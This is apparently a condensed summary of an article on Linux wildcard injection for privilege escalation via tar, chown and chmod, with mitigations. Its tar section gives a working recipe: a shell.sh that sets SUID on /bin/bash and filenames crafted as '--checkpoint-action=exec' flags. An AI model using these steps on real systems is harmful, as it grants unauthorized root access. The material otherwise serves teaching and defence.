https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/?source=post_page-----94fdc1a73636---------------------------------------

The article from _Hacking Articles_ explains how an attacker can leverage **Wildcard (Glob) Injection** to escalate privileges from a low-privileged user to `root` on Linux systems.

Here is everything in that article condensed down to its core mechanisms, technical techniques, and remediations.

### 1. The Core Vulnerability: What is Wildcard Injection?

Wildcard injection happens when a Linux program or automated cron script executes a built-in system binary using an unquoted wildcard character (like `*`).

- **The Shell Mechanics:** The Unix shell expands the `*` symbol into a list of all filenames present inside the current working directory _before_ passing those names to the binary as arguments.
    
- **The Flaw:** If a regular user has write permissions in that directory, they can create files named after command-line flags (e.g., creating a blank file named `-rf` or `--help`).
    
- **The Result:** When the shell expands the wildcard, the binary interprets those crafted filenames as **operational command-line switches (flags)** instead of raw filenames, forcing the tool to execute unintended administrative features.
    

### 2. Exploitation Methods Covered in the Article

The article outlines three primary binaries that are frequently abused when wrapped in a wildcard command:

#### Method A: Exploiting `tar` (Archive Tool)

When a privileged script runs `tar -cvf backup.tar *`, it can be subverted using `tar`’s built-in debugging checkpoints.

- **The Flags Abused:** `--checkpoint=1` and `--checkpoint-action=exec=COMMAND`.
    
- **The Attack:** An attacker touches two blank files named after those flags and writes a malicious script (e.g., a reverse shell or a command adding a root user to `/etc/passwd`). When `tar` processes the wildcard, it interprets the filenames as instructions to run the malicious script upon archiving the first file.
    
---

Checking /bin/bash perms
```powershell
alice@readys:/home/alice$ ls -l /bin/bash  
-rwxr-xr-x 1 root root 1168776 Apr 18 2019 /bin/bash 
```

Creating shell.sh that adds +s to bash function
```powershell
alice@readys:/home/alice$ cd /var/www/html  
alice@readys:/var/www/html$ cp ~/shell.sh .    
```

Shell.sh
```powershell
#!/bin/bash  
  
chmod +s /bin/bash  
```

Execution
```powershell
echo "" > "--checkpoint-action=exec=sh shell.sh"  
```

```powershell
echo "" > --checkpoint=1 
```

Check if works

```
ls -la /bin/bash
```

#### Method B: Exploiting `chown` (Change Ownership)

When a privileged script changes file ownership across a directory using `chown root:root *`, it can be manipulated to recursively grant ownership of unauthorized files.

- **The Flag Abused:** `--reference=FILENAME`.
    
- **The Attack:** The `--reference` switch tells `chown` to copy the exact owner/group settings of a template file onto all other targets. An attacker crafts a file named `--reference=malicious_file`. If the attacker owns `malicious_file`, `chown` copies those user permissions across the system directory, giving the attacker control over files they shouldn't own.
    

#### Method C: Exploiting `chmod` (Change Permissions)

Similar to `chown`, when a root process runs `chmod 777 *`, it can be subverted using the reference switch.

- **The Flag Abused:** `--reference=FILENAME`.
    
- **The Attack:** An attacker points the `--reference` flag to an executable or configuration file that has wide-open permission bits. `chmod` copies those permissive bits to the target folder, rendering restricted or sensitive files modifiable by lower-level users.
    

### 3. Mitigation and Defensive Remediation

The article highlights that preventing wildcard injection relies on changing how system administrators and automated scripts reference file directories:

- **Use Full Absolute Paths:** Avoid using bare wildcards directly inside a directory. Instead of executing `tar -cf backup.tar *`, prepend the path explicitly:
    
    Bash
    
    ```
    tar -cf backup.tar /var/www/html/*
    ```
    
    When an absolute path is present, the shell expands the wildcard into `/var/www/html/--checkpoint=1`, which the binary correctly interprets as a file path rather than a command flag.
    
- **Implement the Double Dash (`--`) Boundary:** Most standard Linux utilities accept `--` to indicate the end of command-line options. Anything following the double dash is strictly processed as a file positional argument, neutralising the injection:
    
    Bash
    
    ```
    chown root:root -- *
    ```
    
- **Directory Permissions Auditing:** Strictly restrict regular write access to folders where automated, root-level cron jobs or system scripts regularly perform maintenance or compression operations.